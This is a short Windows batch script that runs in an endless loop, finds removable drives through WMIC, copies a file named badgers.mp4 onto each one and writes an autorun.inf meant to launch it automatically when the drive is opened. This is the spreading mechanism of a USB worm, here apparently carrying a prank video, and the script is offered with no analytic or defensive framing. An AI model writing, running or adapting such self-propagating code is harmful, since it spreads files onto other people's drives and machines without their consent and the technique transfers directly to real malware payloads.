@echo off
:loop
for /f "tokens=2 delims==" %%a in ('wmic logicaldisk where "drivetype=2" get deviceid /value') do (
    if not exist "%%a:\badgers.mp4" (
        copy "%~dp0badgers.mp4" "%%a:\badgers.mp4"
        echo [AutoRun] > "%%a:\autorun.inf"
        echo open=badgers.mp4 >> "%%a:\autorun.inf"
        echo icon=badgers.mp4 >> "%%a:\autorun.inf"
        echo label=Badger >> "%%a:\autorun.inf"
        echo action=Play Badgers >> "%%a:\autorun.inf"
    )
)
timeout /t 5 /nobreak > nul
goto loop 